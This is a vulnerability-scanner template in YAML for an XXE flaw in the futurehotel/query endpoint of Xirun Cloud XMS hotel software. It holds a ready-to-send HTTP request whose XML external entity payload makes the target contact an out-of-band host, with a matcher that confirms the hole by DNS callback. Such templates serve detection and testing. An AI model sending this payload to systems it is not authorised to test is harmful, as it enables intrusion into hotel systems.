id: XMS-futurehotel-query-xxe

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 西软云XMS-futurehotel-query接口存在XXE漏洞
  reference:
    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/%E8%A5%BF%E8%BD%AF%E4%BA%91XMS-futurehotel-query%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - raw:
      - |-
        POST /XopServerRS/rest/futurehotel/query HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
        Connection: close
        Content-Type: text/xml
        Accept-Encoding: gzip
        Content-Length: 76

        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"